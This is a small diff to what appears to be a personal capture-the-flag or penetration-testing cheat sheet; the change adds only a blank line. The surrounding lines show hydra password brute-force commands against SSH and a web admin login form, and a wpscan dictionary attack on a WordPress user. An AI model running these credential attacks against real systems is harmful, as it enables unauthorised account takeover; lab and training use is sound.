@@ -23,6 +23,7 @@ hydra $ip -s 22 ssh -l -P big_wordlist.txt
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip http-form-post '/admin/:username=^USER^&password=^PASS^:F=Incorrect Credentials' -V
 ```
 
+
 # wordpress
 ```
 wpscan --url $ip -P /home/kali/Desktop/Chall/thm/fsocity.dic.m -U Elliot
